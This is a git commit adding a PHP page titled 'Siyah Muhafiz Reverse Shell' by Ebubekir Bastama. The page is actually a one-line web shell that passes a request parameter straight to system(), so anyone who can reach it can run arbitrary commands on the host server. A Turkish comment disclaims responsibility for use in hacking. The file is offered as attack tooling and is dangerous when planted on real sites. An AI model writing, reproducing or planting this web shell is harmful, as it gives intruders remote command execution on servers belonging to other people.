e6820bbc2b766117ef95eb2ca1dd3e14592091c2
Ebubekir Bastama <ebubekirbastama@elmalicesmekuruyemis.com>
2019-08-29 11:02:20 +0300

    SyhMhfz Reverse Shell
    Web Reverse Shell

---
+++ index.php
@@ -0,0 +1,15 @@
+<!DOCTYPE html>
+<!--
+Bu Proje By& Ebubekir Bastama Anti-Güvenlik Sisteleri için yazılmış olup hacking işlevinde kullanımı esnasında kullanıcı sorumludur.
+-->
+<html>
+    <head>
+        <meta charset="UTF-8">
+    <title>Siyah Muhafiz Reverse Shell</title>
+</head>
+<body>
+    <?php
+    echo system($_REQUEST['syhmhz']);
+    ?>
+</body>
+</html>
